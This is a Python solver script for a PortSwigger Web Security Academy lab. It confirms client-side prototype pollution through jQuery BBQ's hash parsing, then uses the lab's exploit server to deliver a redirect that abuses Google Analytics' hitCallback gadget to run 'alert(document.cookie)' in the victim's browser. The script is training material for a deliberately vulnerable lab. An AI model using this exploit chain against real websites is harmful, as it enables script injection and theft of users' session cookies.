#!/usr/bin/env python3
"""
Client-side prototype pollution in third-party libraries
PortSwigger Web Security Academy -- Client-Side Prototype Pollution

Companion script for the writeup: 05-client-side-prototype-pollution-in-third-party-libraries.md

What this does:
    Confirms the source with Playwright first: jQuery BBQ's $.deparam(),
    parsing the URL *hash fragment*, pollutes Object.prototype the same way
    the earlier labs' query-string parsers do (#__proto__[foo]=bar). The
    gadget is Google Analytics' hitCallback -- ga.js invokes it as a
    function once a tracking beacon finishes sending, and if
    Object.prototype.hitCallback holds a string instead, that string gets
    evaluated as code.

    Because the fragment is never sent to the server, and because the lab
    only flips to solved when its own simulated *victim* browser visits the
    polluted URL (not when we visit it ourselves), the real delivery has to
    go through PortSwigger's exploit server rather than a bare navigation --
    exactly as the writeup describes. This script automates that: it finds
    the lab's exploit-server URL, stores an HTML page that redirects to the
    polluted fragment, and delivers it to the victim, using the same
    store/deliver POST pattern our other DOM XSS lab wrappers use
    (Brain/Web/Capabilities/DOMBased.py's _exploit_server_deliver). Note the
    capability file's own lab_client_third_party() wrapper in
    PrototypePollution.py never actually implemented this -- it fell back to
    generic gadget scanning that would not have solved this lab. This
    script closes that gap by using the framework's established
    exploit-server pattern, which matches what the writeup says we did.

Usage:
    python 05-client-side-prototype-pollution-in-third-party-libraries.py <lab-url>
    e.g. python 05-client-side-prototype-pollution-in-third-party-libraries.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
    pip install playwright && playwright install chromium
"""

import re
import sys
import time

import httpx
from playwright.sync_api import sync_playwright


def _get_exploit_server_url(client: httpx.Client, lab_url: str) -> str:
    r = client.get(lab_url)
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else ""


def _exploit_server_deliver(client: httpx.Client, exploit_url: str, body_html: str) -> None:
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    client.post(exploit_url, data={
        "urlIsHttps": "on", "responseFile": "/exploit",
        "responseHead": headers, "responseBody": body_html,
        "formAction": "STORE",
    })
    client.post(exploit_url, data={
        "urlIsHttps": "on", "responseFile": "/exploit",
        "responseHead": headers, "responseBody": body_html,
        "formAction": "DELIVER_TO_VICTIM",
    })


def solve(lab_url: str) -> None:
    # Confirm the hash-fragment source with a real browser -- jQuery BBQ's
    # $.deparam() only runs against document.location.hash.
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        page.goto(f"{lab_url}/#__proto__[pptest]=confirmed", wait_until="networkidle")
        polluted = page.evaluate("() => Object.prototype.pptest")
        browser.close()

    if polluted != "confirmed":
        print("[-] Hash-fragment source did not pollute Object.prototype -- aborting.")
        return
    print("[+] Source confirmed: #__proto__[foo]=bar (jQuery BBQ $.deparam()) pollutes Object.prototype")

    client = httpx.Client(follow_redirects=True, timeout=15)
    exploit_url = _get_exploit_server_url(client, lab_url)
    if not exploit_url:
        print("[-] Could not find this lab's exploit-server URL -- aborting.")
        return
    print(f"[*] Exploit server: {exploit_url}")

    # hitCallback gadget: ga.js calls it as a function after a tracking beacon
    # sends -- pollute it with a string and it gets evaluated as code.
    payload_fragment = "#__proto__[hitCallback]=alert%28document.cookie%29"
    body_html = f'<script>\n    location="{lab_url}/{payload_fragment}"\n</script>'
    print(f"[*] Delivering redirect to victim: {lab_url}/{payload_fragment}")
    _exploit_server_deliver(client, exploit_url, body_html)

    time.sleep(2)  # give the lab's backend a moment to process the delivery
    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- victim's document.cookie was alerted via the hitCallback gadget.")
    else:
        print("[-] Not solved yet -- check the exploit server's access log for the victim's visit.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
